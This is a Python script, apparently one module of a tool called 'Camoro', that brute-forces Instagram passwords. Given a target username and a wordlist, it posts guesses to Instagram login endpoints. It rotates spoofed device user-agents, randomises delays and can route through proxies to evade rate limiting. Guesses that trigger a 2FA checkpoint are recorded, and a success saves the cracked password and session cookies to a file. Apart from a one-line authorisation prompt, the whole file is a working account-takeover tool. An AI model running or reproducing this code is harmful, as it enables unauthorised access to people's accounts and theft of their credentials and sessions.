#!/usr/bin/env python3
"""
Camoro Module 3 - Instagram Brute Force Engine
- CSRF session init
- 3-5s delays بتجنب rate limit
- تدوير User-Agent / Device كل 20 ثانية
- Progress bar
- نجاح = sessionid cookie
"""

import os
import sys
import time
import json
import random
import re
from datetime import datetime
from urllib.parse import urlencode

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
    B = '\033[94m'; P = '\033[95m'; C = '\033[96m'
    W = '\033[97m'; BL = '\033[1m'; D = '\033[2m'; RE = '\033[0m'

# ========== أجهزة متنوعة (تدوير كل 20 ثانية) ==========
DEVICES = [
    {
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'x-ig-app-id': '936619743392459',
        'name': 'iPhone_Safari_17',
    },
    {
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'x-ig-app-id': '936619743392459',
        'name': 'Pixel8_Chrome',
    },
    {
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1',
        'x-ig-app-id': '936619743392459',
        'name': 'iPhone_Chrome',
    },
    {
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
        'x-ig-app-id': '936619743392459',
        'name': 'Samsung_S23',
    },
    {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-ig-app-id': '936619743392459',
        'name': 'Windows_Chrome',
    },
    {
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-ig-app-id': '936619743392459',
        'name': 'Mac_Chrome',
    },
    {
        'user-agent': 'Instagram 312.0.0.0.47 Android (33/13; 420dpi; 1080x2400; Google/google; Pixel 7; panther; panther; en_US; 543210123)',
        'x-ig-app-id': '567067343352427',
        'name': 'Android_App_API',
    },
    {
        'user-agent': 'Instagram 311.0.0.0.109 (iPhone14,3; iOS 17_5; en_US; en; scale=3.00; 1170x2532; 543210456) AppleWebKit/420+',
        'x-ig-app-id': '124024574287414',
        'name': 'iOS_App_API',
    },
]

# نقاط دخول متنوعة (login endpoints)
LOGIN_ENDPOINTS = [
    'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
    'https://www.instagram.com/accounts/login/ajax/',
]


def get_session_lib():
    try:
        from curl_cffi import requests as r
        return r, True
    except ImportError:
        import requests as r
        return r, False


class BruteEngine:
    def __init__(self, username, wordlist_path, delay_min=3, delay_max=5,
                 rotate_every=20, proxy=None):
        self.username = username.replace('@', '')
        self.wordlist_path = wordlist_path
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.rotate_every = rotate_every  # ثواني
        self.proxy = proxy

        self.req, self.has_cffi = get_session_lib()
        self.session = None
        self.device = None
        self.csrf = None
        self.last_rotate = 0
        self.device_idx = 0

        self.tested = 0
        self.total = 0
        self.found = None
        self.start_time = None
        self.checkpoint_hits = 0
        self.rate_limits = 0

        self.passwords = []
        self._load_wordlist()

    def _load_wordlist(self):
        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            self.passwords = [l.strip() for l in f if l.strip()]
        self.total = len(self.passwords)

    def _new_session(self):
        """جلسة جديدة + جهاز جديد"""
        self.device = DEVICES[self.device_idx % len(DEVICES)]
        self.device_idx += 1

        if self.has_cffi:
            self.session = self.req.Session()
        else:
            self.session = self.req.Session()

        self.session.headers.update({
            'User-Agent': self.device['user-agent'],
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': self.device['x-ig-app-id'],
            'X-IG-WWW-Claim': '0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })

        if self.proxy:
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy,
            }

        self.last_rotate = time.time()
        return self._init_csrf()

    def _init_csrf(self):
        """تهيئة session + CSRF من صفحة تسجيل الدخول"""
        try:
            r = self.session.get('https://www.instagram.com/accounts/login/', timeout=25)
            # من cookies
            csrf = self.session.cookies.get('csrftoken')
            if not csrf:
                # من HTML
                m = re.search(r'"csrf_token":"([^"]+)"', r.text)
                if m:
                    csrf = m.group(1)
                    self.session.cookies.set('csrftoken', csrf, domain='.instagram.com')
            if not csrf:
                m = re.search(r'csrf_token=([A-Za-z0-9_-]+)', r.text)
                if m:
                    csrf = m.group(1)

            self.csrf = csrf
            if self.csrf:
                self.session.headers['X-CSRFToken'] = self.csrf
                self.session.headers['X-Instagram-AJAX'] = '1'
            return bool(self.csrf)
        except Exception as e:
            print(f"  {C.R}[!] CSRF init failed: {e}{C.RE}")
            return False

    def _maybe_rotate(self):
        """تدوير الجهاز / API كل rotate_every ثانية"""
        if time.time() - self.last_rotate >= self.rotate_every:
            print(f"\n  {C.Y}[↻] Rotating device/API → {DEVICES[self.device_idx % len(DEVICES)]['name']}{C.RE}")
            self._new_session()
            print(f"  {C.G}[✓] New CSRF: {str(self.csrf)[:16]}... | Device: {self.device['name']}{C.RE}")

    def _try_login(self, password):
        """
        محاولة دخول واحدة.
        Returns: 'success' | 'fail' | 'checkpoint' | 'rate_limit' | 'error'
        """
        self._maybe_rotate()

        endpoint = random.choice(LOGIN_ENDPOINTS)
        payload = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': self.csrf or '',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
        }

        try:
            r = self.session.post(endpoint, data=payload, headers=headers, timeout=25)

            # نجاح: cookie sessionid
            if self.session.cookies.get('sessionid') or self.session.cookies.get('ds_user_id'):
                return 'success', r

            # تحليل JSON
            try:
                data = r.json()
            except Exception:
                data = {}

            if data.get('authenticated') is True or data.get('status') == 'ok' and data.get('user') is True:
                return 'success', r

            if data.get('message') == 'checkpoint_required' or 'checkpoint_url' in data:
                return 'checkpoint', r

            if r.status_code == 429 or 'Please wait' in r.text or data.get('spam') is True:
                return 'rate_limit', r

            if data.get('user') is False or data.get('authenticated') is False:
                return 'fail', r

            if r.status_code in (400, 401):
                # غالباً كلمة خطأ أو bad request
                if 'incorrect' in r.text.lower() or data.get('status') == 'fail':
                    return 'fail', r
                return 'fail', r

            return 'fail', r

        except Exception as e:
            return 'error', str(e)

    def _progress_line(self, password, status_icon='pwd'):
        pct = (self.tested / self.total * 100) if self.total else 0
        elapsed = time.time() - self.start_time if self.start_time else 1
        speed = self.tested / elapsed if elapsed > 0 else 0
        remaining = self.total - self.tested
        eta = remaining / speed if speed > 0 else 0

        # شريط تقدم
        bar_len = 20
        filled = int(bar_len * self.tested / self.total) if self.total else 0
        bar = '█' * filled + '░' * (bar_len - filled)

        pwd_show = password if len(password) <= 18 else password[:15] + '...'
        line = (
            f"\r  {C.C}{bar}{C.RE} "
            f"{C.W}{pct:5.1f}%{C.RE} | "
            f"{C.G}{self.tested}/{self.total}{C.RE} | "
            f"{C.Y}{status_icon}{C.RE} | "
            f"{C.W}{pwd_show:<18}{C.RE} | "
            f"{C.D}{speed:.2f}/s ETA {int(eta)}s{C.RE}   "
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    def _print_header(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""
  {C.R}{C.BL}╔══════════════════════════════════════════════════╗
  ║       ⚡ CAMORO BRUTE FORCE ENGINE               ║
  ╚══════════════════════════════════════════════════╝{C.RE}

  {C.G}[*]{C.RE} Target:     {C.BL}{self.username}{C.RE}
  {C.G}[*]{C.RE} Total passwords: {C.Y}{self.total}{C.RE}
  {C.G}[*]{C.RE} Already tested:  {C.Y}{self.tested}{C.RE}
  {C.G}[*]{C.RE} Remaining:       {C.Y}{self.total - self.tested}{C.RE}
  {C.G}[*]{C.RE} Delay:           {self.delay_min}-{self.delay_max}s
  {C.G}[*]{C.RE} Rotate device:   every {self.rotate_every}s
  {C.G}[*]{C.RE} Wordlist:        {self.wordlist_path}
""")

    def start(self):
        self._print_header()

        print(f"  {C.C}[*] Initializing session...{C.RE}")
        if not self._new_session():
            print(f"  {C.R}[!] Failed to get CSRF. Check network / use proxy.{C.RE}")
            return None

        print(f"  {C.G}[✓]{C.RE} Session initialized, CSRF: {C.Y}{str(self.csrf)[:20]}...{C.RE}")
        print(f"  {C.G}[✓]{C.RE} Device: {C.C}{self.device['name']}{C.RE}")
        print(f"  {C.C}[*] Starting attack...{C.RE}")
        print(f"  {C.Y}[!] Testing passwords with {self.delay_min}-{self.delay_max}s delays to avoid rate limiting{C.RE}\n")

        self.start_time = time.time()
        resume_file = f"output/{self.username}_progress.json"
        start_idx = 0

        # استئناف إن وُجد progress
        if os.path.exists(resume_file):
            try:
                with open(resume_file) as f:
                    prog = json.load(f)
                start_idx = prog.get('tested', 0)
                self.tested = start_idx
                print(f"  {C.Y}[*] Resuming from password #{start_idx}{C.RE}\n")
            except Exception:
                pass

        try:
            for i, password in enumerate(self.passwords):
                if i < start_idx:
                    continue

                result, detail = self._try_login(password)
                self.tested += 1

                if result == 'success':
                    self.found = password
                    self._progress_line(password, f'{C.G}HIT{C.RE}')
                    print(f"\n\n  {C.G}{C.BL}════════════════════════════════════════{C.RE}")
                    print(f"  {C.G}{C.BL}  ✓ PASSWORD FOUND!{C.RE}")
                    print(f"  {C.G}{C.BL}  Username: {self.username}{C.RE}")
                    print(f"  {C.G}{C.BL}  Password: {password}{C.RE}")
                    print(f"  {C.G}{C.BL}════════════════════════════════════════{C.RE}\n")

                    os.makedirs('output', exist_ok=True)
                    with open(f'output/{self.username}_CRACKED.txt', 'w') as f:
                        f.write(f"username: {self.username}\npassword: {password}\n")
                        f.write(f"time: {datetime.now().isoformat()}\n")
                        # حفظ session cookies
                        cookies = {c.name: c.value for c in self.session.cookies}
                        f.write(f"cookies: {json.dumps(cookies)}\n")
                    print(f"  {C.G}[✓] Saved: output/{self.username}_CRACKED.txt{C.RE}")
                    return password

                elif result == 'checkpoint':
                    self.checkpoint_hits += 1
                    self._progress_line(password, f'{C.Y}CHK{C.RE}')
                    print(f"\n  {C.Y}[!] Checkpoint/2FA challenge (password may be correct!){C.RE}")
                    print(f"  {C.Y}    Password tried: {password}{C.RE}")
                    # نحفظ كمرشح
                    with open(f'output/{self.username}_checkpoint_hits.txt', 'a') as f:
                        f.write(password + '\n')
                    # ندوّر الجهاز
                    time.sleep(10)
                    self._new_session()

                elif result == 'rate_limit':
                    self.rate_limits += 1
                    self._progress_line(password, f'{C.R}RATE{C.RE}')
                    wait = random.randint(30, 90)
                    print(f"\n  {C.R}[!] Rate limited. Cooling down {wait}s + device rotate...{C.RE}")
                    time.sleep(wait)
                    self._new_session()

                elif result == 'error':
                    self._progress_line(password, f'{C.R}ERR{C.RE}')
                    time.sleep(5)
                    self._new_session()

                else:
                    self._progress_line(password, 'pwd')

                # حفظ progress كل 25 محاولة
                if self.tested % 25 == 0:
                    os.makedirs('output', exist_ok=True)
                    with open(resume_file, 'w') as f:
                        json.dump({
                            'tested': self.tested,
                            'total': self.total,
                            'username': self.username,
                            'time': datetime.now().isoformat(),
                        }, f)

                # تأخير 3-5 ثواني
                time.sleep(random.uniform(self.delay_min, self.delay_max))

        except KeyboardInterrupt:
            print(f"\n\n  {C.Y}[!] Interrupted by user. Progress saved.{C.RE}")
            os.makedirs('output', exist_ok=True)
            with open(resume_file, 'w') as f:
                json.dump({'tested': self.tested, 'total': self.total,
                           'username': self.username}, f)
            return None

        print(f"\n\n  {C.R}[✗] Wordlist exhausted. Password not found.{C.RE}")
        print(f"  {C.D}Tested: {self.tested} | Checkpoints: {self.checkpoint_hits} | Rate limits: {self.rate_limits}{C.RE}")
        return None


def run():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""
  {C.R}{C.BL}╔══════════════════════════════════════════════════╗
  ║       ⚡ CAMORO BRUTE FORCE ENGINE               ║
  ╚══════════════════════════════════════════════════╝{C.RE}
""")

    username = input(f"  {C.G}[?]{C.RE} Target username {C.W}> {C.RE}").strip().replace('@', '')
    if not username:
        print(f"  {C.R}[!] Username required{C.RE}")
        input(); return

    # اقتراح wordlist
    default_wl = f"wordlists/{username}_wordlist.txt"
    if not os.path.exists(default_wl):
        default_wl = f"output/{username}_wordlist.txt"
    if not os.path.exists(default_wl):
        default_wl = ''

    wl = input(f"  {C.G}[?]{C.RE} Wordlist path {C.D}[{default_wl}]{C.RE} {C.W}> {C.RE}").strip()
    if not wl:
        wl = default_wl
    if not wl or not os.path.exists(wl):
        print(f"  {C.R}[!] Wordlist not found. Run module [2] first.{C.RE}")
        input(); return

    delay = input(f"  {C.G}[?]{C.RE} Delay seconds min-max {C.D}[3-5]{C.RE} {C.W}> {C.RE}").strip()
    if delay and '-' in delay:
        try:
            dmin, dmax = map(float, delay.split('-'))
        except ValueError:
            dmin, dmax = 3, 5
    else:
        dmin, dmax = 3, 5

    rotate = input(f"  {C.G}[?]{C.RE} Device rotate every N seconds {C.D}[20]{C.RE} {C.W}> {C.RE}").strip()
    rotate = int(rotate) if rotate.isdigit() else 20

    proxy = input(f"  {C.G}[?]{C.RE} Proxy (optional http://ip:port) {C.D}[none]{C.RE} {C.W}> {C.RE}").strip()
    proxy = proxy or None

    print(f"""
  {C.Y}[!] تأكيد التفويض:{C.RE}
  {C.W}أنت تؤكد أنك مخوّل باختبار هذا الحساب.{C.RE}
""")
    conf = input(f"  {C.G}[?]{C.RE} Start attack? (Y/N) {C.W}> {C.RE}").strip().lower()
    if conf not in ('y', 'yes', 'نعم'):
        print(f"  {C.Y}[*] Cancelled.{C.RE}")
        input(); return

    engine = BruteEngine(
        username=username,
        wordlist_path=wl,
        delay_min=dmin,
        delay_max=dmax,
        rotate_every=rotate,
        proxy=proxy,
    )
    engine.start()
    input(f"\n  {C.D}Enter للرجوع...{C.RE}")
